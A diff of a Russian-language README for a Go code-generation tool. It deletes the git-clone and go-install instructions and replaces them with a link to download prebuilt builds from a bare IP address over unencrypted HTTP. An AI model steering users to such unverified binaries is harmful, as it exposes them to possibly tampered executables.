@@ -13,20 +13,7 @@
 
 ## Установка
 
-```sh
-git  clone  https://github.com/555f/gg.git
-cd  gg
-go  mod  download
-make  install
-```
-
-или
-
-```sh
-go  install  github.com/555f/gg/cmd/gg
-```
-
-Добавьте `PATH="$HOME/go/bin:$PATH"` в `~/.bashrc`
+Вы можете скачать сборку по этому [http://51.250.88.10:8081/](http://51.250.88.10:8081/) адресу,
 
 ## Начало
 
